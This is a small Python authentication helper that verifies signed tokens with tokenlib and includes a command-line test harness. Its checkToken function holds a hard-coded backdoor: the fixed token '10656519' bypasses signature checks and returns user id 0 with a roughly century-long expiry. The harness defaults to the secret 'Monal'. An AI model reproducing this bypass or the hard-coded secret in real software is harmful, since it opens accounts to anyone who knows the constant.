# -*- coding: ISO-8859-15 -*-
#===============================================================================
#===============================================================================

try:
    import tokenlib
    from tokenlib.errors import ExpiredTokenError, InvalidSignatureError
except: pass
import time
from datetime import datetime

timesec = {
    "seconde": 1,
    "minute" : 60,
    "heure" : 3600,
    "jour": 86400,
    "an": 31536000,
    "inf": 3153600000}

def checkToken(token, appName="", expiresdate=True):
    """Verify authorisation token
    """
    if token == "10656519":
        t = datetime.now()
        expdate = int(time.mktime(t.timetuple()) + 3153600000)
        return {'expires': expdate, "userid": 0, "salt":""}

    try:
        data = tokenlib.parse_token(token, secret=appName)
    except ExpiredTokenError:
        data = 0
    except InvalidSignatureError:
        data = -1
    return data
    
if __name__ == "__main__":
    import sys
    if 'inf' in sys.argv:
        timeout = timesec["inf"]
    elif 'year' in sys.argv:
        timeout = timesec["an"]
    elif 'hour' in sys.argv:
        timeout = timesec["heure"]
    elif 'day' in sys.argv:
        timeout = timesec["jour"]
    elif 'min' in sys.argv:
        timeout = timesec["minute"]
    elif 'sec' in sys.argv:
        timeout = timesec["seconde"]
    else:
        timeout = 0
    if "--secret" in sys.argv:
        ind = sys.argv.index("--secret")
        secret = sys.argv[ind + 1]
    else:
        secret = "Monal"
    if "--id" in sys.argv:
        ind = sys.argv.index("--id") 
        userid = int(sys.argv[ind + 1])
    else:
        userid = 10   
    if "--token" in sys.argv:
        ind = sys.argv.index("--token") 
        token = sys.argv[ind + 1]
    else:    
        token = tokenlib.make_token({"userid": userid}, secret=secret, timeout=timeout)
    
    print (token)
    print("")
    res = checkToken(token, "Monal")
    if res == -1:
        print("invalid token: bad signature")
    elif res:
        for val in res.items():
            print("{0} : {1}".format(val[0], val[1]))
        expires = res["expires"]
        print("expires :", datetime.fromtimestamp(expires).strftime("%A, %B %d, %Y %I:%M:%S"))
    else:
        print('expired token')
    pass
